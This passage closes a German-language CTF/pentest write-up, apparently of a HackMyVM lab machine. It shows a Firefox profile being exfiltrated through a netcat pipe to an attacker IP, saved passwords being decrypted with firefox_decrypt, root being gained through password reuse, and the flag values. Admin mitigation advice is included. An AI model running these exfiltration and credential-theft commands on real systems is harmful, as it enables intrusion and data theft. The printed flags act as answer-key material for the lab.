+            <p class="analysis"><strong>Analyse:</strong> Um die Profildaten zu exfiltrieren, habe ich zunächst versucht, das Verzeichnis mit `tar` zu packen und über einen Python-HTTP-Server herunterzuladen. Dies schlug aufgrund von Berechtigungsproblemen fehl. Als robustere Methode habe ich dann die Daten direkt über eine `netcat`-Pipe übertragen. Auf meiner Maschine startete ich einen Listener, der die eingehenden Daten in eine Datei schreibt: `nc -lvnp 1234 > firefox_profile.tar.gz`. Auf dem Zielsystem habe ich `tar` angewiesen, das Profilverzeichnis zu packen und die Ausgabe direkt an `nc` zu senden, das sich mit meinem Listener verbindet: `tar -czf - ... | nc 192.168.2.199 1234`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">## Auf Angreifer-Maschine ##</span>
+┌──(root㉿CCat)-[~/firefoxcrack]
+└─# nc -lvnp 1234 > firefox_profile.tar.gz
+listening on [any] 1234 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.209] 45382
+
+<span class="password">## Auf Ziel-Maschine (als andrew) ##</span>
+andrew@quick5:~$ tar -czf - /home/andrew/snap/firefox/common/.mozilla/firefox/ii990jpt.default/ | nc 192.168.2.199 1234
+tar: Removing leading `/' from member names
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Diese Methode ist extrem effektiv und zuverlässig für die Exfiltration von Daten, wenn direkte Downloads fehlschlagen. Sie umgeht Probleme mit Schreibrechten und hinterlässt keine temporären Dateien auf der Festplatte des Zielsystems. Der Transfer war erfolgreich, und ich habe nun eine vollständige Kopie des Firefox-Profils auf meiner Maschine.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beherrschen Sie die Kunst der Datenübertragung über Pipes mit `netcat` oder `socat`. Es ist eine fundamentale Fähigkeit für Szenarien, in denen Standard-Tools wie `wget` oder `scp` nicht verfügbar oder praktikabel sind.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie den Netzwerkverkehr auf ungewöhnliche, langlebige Verbindungen zu unbekannten Ports. Egress-Filterung, die ausgehende Verbindungen auf das Notwendigste beschränkt, kann solche Exfiltrationsversuche erschweren oder blockieren.</p>
+            
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/…/common/.mozilla/firefox/ii990jpt.default]
+└─# <span class="command">python3 /root/Hackingtools/firefox_decrypt/firefox_decrypt.py .</span></div>
+                    <pre>
+2025-06-05 17:18:15,282 - WARNING - profile.ini not found in .
+2025-06-05 17:18:15,282 - WARNING - Continuing and assuming '.' is a profile location
+
+<span class="password">Website:   http://employee.quick.hmv</span>
+<span class="password">Username: 'andrew.speed@quick.hmv'</span>
+<span class="password">Password: 'SuperSecretPassword'</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich das Profil extrahiert und entpackt hatte, verwendete ich das Tool `firefox_decrypt.py` auf meinem Kali-System, um die Passwörter aus den Profildateien zu extrahieren. Das Skript hat erfolgreich die Anmeldeinformationen für die Mitarbeiter-Webseite `http://employee.quick.hmv` entschlüsselt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein voller Erfolg. Ich habe jetzt gültige Anmeldeinformationen: Benutzername `andrew.speed@quick.hmv` und das Passwort `SuperSecretPassword`. Dieses Passwort ist ein starker Kandidat für die Wiederverwendung bei anderen Diensten, insbesondere für den `root`-Account oder `andrew`s Systempasswort.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie spezialisierte Post-Exploitation-Tools, um Anmeldeinformationen aus Browsern, Konfigurationsdateien und dem Speicher zu extrahieren. Tools wie `LaZagne` oder spezifische Skripte wie `firefox_decrypt` sind hierfür ideal.<br><strong>Empfehlung (Admin):</strong> Passwort-Wiederverwendung ist eine der größten Bedrohungen. Erzwingen Sie eine strikte Passwortrichtlinie, die einzigartige Passwörter für verschiedene Dienste vorschreibt. Multi-Faktor-Authentifizierung (MFA) ist die effektivste Maßnahme, um die Ausnutzung gestohlener Anmeldeinformationen zu verhindern.</p>
+            
+            <p class="analysis"><strong>Analyse:</strong> Ein Versuch, sich mit den gefundenen Zugangsdaten auf der `employee.quick.hmv`-Webseite einzuloggen, schlug fehl, da die Seite gewartet wird. Nach CTF-Logik und gängiger Praxis bei schwachen Passwortrichtlinien habe ich versucht, das gefundene Passwort `SuperSecretPassword` für den `root`-Benutzer über `su` zu verwenden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+andrew@quick5:~$ su root
+Password: <span class="password">SuperSecretPassword</span>
+<span class="password">root@quick5:/home/andrew#</span> 
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Das Passwort wurde wiederverwendet. Der `root`-Benutzer hat dasselbe Passwort wie der Benutzer `andrew.speed` für die Mitarbeiter-Webseite. Ich habe nun vollständige Root-Rechte auf dem System und damit den Pentest erfolgreich abgeschlossen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie gefundene Passwörter immer systemweit (Password Spraying). Probieren Sie es für den aktuellen Benutzer, für `root` und für andere entdeckte Benutzer auf Diensten wie SSH oder `su`. Die Wiederverwendung von Passwörtern ist ein extrem häufiger und erfolgreicher Angriffsvektor.<br><strong>Empfehlung (Admin):</strong> Dies ist ein Lehrbuchbeispiel dafür, warum Passwort-Wiederverwendung katastrophal ist. Implementieren Sie technische Kontrollen, die eine Wiederverwendung von Passwörtern verhindern (Passworthistorie) und schulen Sie Ihre Mitarbeiter intensiv über die damit verbundenen Gefahren.</p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/andrew/user.txt</div>
+                    <div class="flag-value"><span class="password">HMV{f1a85c0f54de51d374e15173a2d71cd6}</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/root.txt</div>
+                    <div class="flag-value"><span class="password">HMV{7b243f33c5eb851f1c73fb6d6b3a974a}</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben - Cyber Security Reports</p>
+        <p>Berichtsdatum: 05. Juni 2025</p>
+    </footer>
+</body>
+</html>
